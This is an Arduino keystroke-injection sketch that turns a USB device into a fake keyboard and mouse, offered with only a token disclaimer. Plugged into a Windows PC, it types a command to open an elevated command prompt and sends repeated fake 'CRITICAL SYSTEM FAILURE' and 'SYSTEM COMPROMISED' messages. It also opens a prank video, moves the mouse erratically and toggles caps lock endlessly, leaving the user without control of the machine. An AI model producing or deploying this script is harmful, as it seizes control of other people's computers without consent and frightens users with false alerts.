#include <Keyboard.h>
#include <Mouse.h>

// A code created by ViperFSFA
// Do NOT use for Unethical use !!THATS ILLIGAL!!
// #Hacktheplanet

void setup() {
  Keyboard.begin();
  Mouse.begin();
  delay(2000); 

  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);


  Keyboard.print("powershell Start-Process cmd -Verb RunAs");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);


  for (int i = 0; i < 10; i++) {
    Keyboard.print("msg * \"CRITICAL SYSTEM FAILURE: USB DEVICE CORRUPTED\"");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);
  }


  Keyboard.print("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);


  for (int i = 0; i < 500; i++) {
    Mouse.move(random(-50, 50), random(-50, 50));
    delay(10);
  }


  for (int i = 0; i < 100; i++) {
    Keyboard.print("ERROR! ERROR! SYSTEM COMPROMISED!");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);
  }

 
  while (true) {
    Keyboard.press(KEY_CAPS_LOCK);
    delay(100);
    Keyboard.release(KEY_CAPS_LOCK);
    delay(100);
  }
}

// Uncomment these lines for extra effect

//Keyboard.print("powershell (New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Alarm10.wav').PlaySync()");
//Keyboard.press(KEY_RETURN);
//Keyboard.releaseAll();
//delay(1000);

void loop() {} 
